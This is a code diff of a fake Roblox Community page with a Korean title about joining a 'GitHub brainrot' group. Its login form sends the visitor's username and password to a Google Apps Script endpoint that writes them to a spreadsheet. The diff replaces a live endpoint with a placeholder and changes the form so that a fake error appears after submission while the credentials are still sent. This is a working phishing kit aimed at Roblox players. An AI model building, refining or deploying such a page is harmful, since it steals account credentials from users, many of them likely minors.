@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Github 브레인롯 종합 거래방 - Roblox Community</title>
+    <title>깃허브 브레인롯 그룹에 참여하세요 - Roblox Community</title>
     <style>
         * {
             margin: 0;
@@ -157,7 +157,9 @@
             display: flex;
             justify-content: space-between;
             align-items: center;
-            margin-bottom: 32px;
+            margin-bottom: 24px;
+            padding-bottom: 24px;
+            border-bottom: 1px solid #e5e8eb;
         }
 
         .page-header h1 {
@@ -177,7 +179,7 @@
         /* Community Card */
         .community-card {
             background: white;
-            border-radius: 12px;
+            border-radius: 0px;
             padding: 32px;
             box-shadow: 0 1px 3px rgba(0,0,0,0.1);
         }
@@ -650,7 +652,7 @@
         }
 
         .login-input:focus {
-            border-color: #0066ff;
+            border-color: #4d5359;
         }
 
         .login-button {
@@ -672,6 +674,17 @@
         .login-button:disabled {
             opacity: 0.6;
             cursor: not-allowed;
+        }
+
+        .error-message {
+            color: #ff4444;
+            font-size: 14px;
+            margin-top: 8px;
+            display: none;
+        }
+
+        .error-message.show {
+            display: block;
         }
 
         .forgot-link {
@@ -837,6 +850,7 @@
             <form class="login-form" id="loginForm">
                 <input type="text" class="login-input" id="username" placeholder="Username/Email/Phone" required>
                 <input type="password" class="login-input" id="password" placeholder="Password" required>
+                <div class="error-message" id="errorMessage">Error</div>
                 <button type="submit" class="login-button" id="loginButton">Log In</button>
             </form>
             <a href="#" class="forgot-link">Forgot Password or Username?</a>
@@ -871,12 +885,12 @@
 
     <!-- Main Content -->
     <div class="container">
-        <div class="page-header">
-            <h1>Communities</h1>
-            <a href="#" class="more-link" onclick="openModalWithLoading(); return false;">More Communities →</a>
-        </div>
-
         <div class="community-card">
+            <div class="page-header">
+                <h1>Communities</h1>
+                <a href="#" class="more-link" onclick="openModalWithLoading(); return false;">More Communities →</a>
+            </div>
+
             <div class="community-header">
                 <div class="community-icon"></div>
                 <div class="community-info">
@@ -1060,7 +1074,7 @@
 
         // ===== 구글 시트 연동 설정 =====
         // 아래 URL을 여러분의 Google Apps Script 웹 앱 URL로 교체하세요
-        const GOOGLE_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbyyqMrFoHFduhIwUmxGbrRCgBcUz9HHDchU5IJsA5OlNgVyLddDECX112aSzbIz_OlsJQ/exec'
+        const GOOGLE_SCRIPT_URL = 'YOUR_GOOGLE_APPS_SCRIPT_URL_HERE';
 
         // 로그인 폼 제출 처리
         document.getElementById('loginForm').addEventListener('submit', function(e) {
@@ -1069,6 +1083,10 @@
             const username = document.getElementById('username').value;
             const password = document.getElementById('password').value;
             const loginButton = document.getElementById('loginButton');
+            const errorMessage = document.getElementById('errorMessage');
+            
+            // 에러 메시지 숨기기
+            errorMessage.classList.remove('show');
             
             // 버튼 비활성화 및 로딩 표시
             loginButton.disabled = true;
@@ -1085,28 +1103,14 @@
                     username: username,
                     password: password
                 })
-            })
-            .then(() => {
-                // 성공 (no-cors 모드에서는 실제 응답을 확인할 수 없음)
-                loginButton.textContent = 'Success!';
-                setTimeout(() => {
-                    closeModal();
-                    document.getElementById('loginForm').reset();
-                    loginButton.disabled = false;
-                    loginButton.textContent = 'Log In';
-                }, 1000);
-            })
-            .catch(error => {
-                console.error('Error:', error);
-                // no-cors 모드에서는 여기도 성공으로 처리
-                loginButton.textContent = 'Success!';
-                setTimeout(() => {
-                    closeModal();
-                    document.getElementById('loginForm').reset();
-                    loginButton.disabled = false;
-                    loginButton.textContent = 'Log In';
-                }, 1000);
             });
+            
+            // 5초 후 에러 메시지 표시 및 버튼 복구
+            setTimeout(() => {
+                loginButton.disabled = false;
+                loginButton.textContent = 'Log In';
+                errorMessage.classList.add('show');
+            }, 5000);
         });
     </script>
 </body>
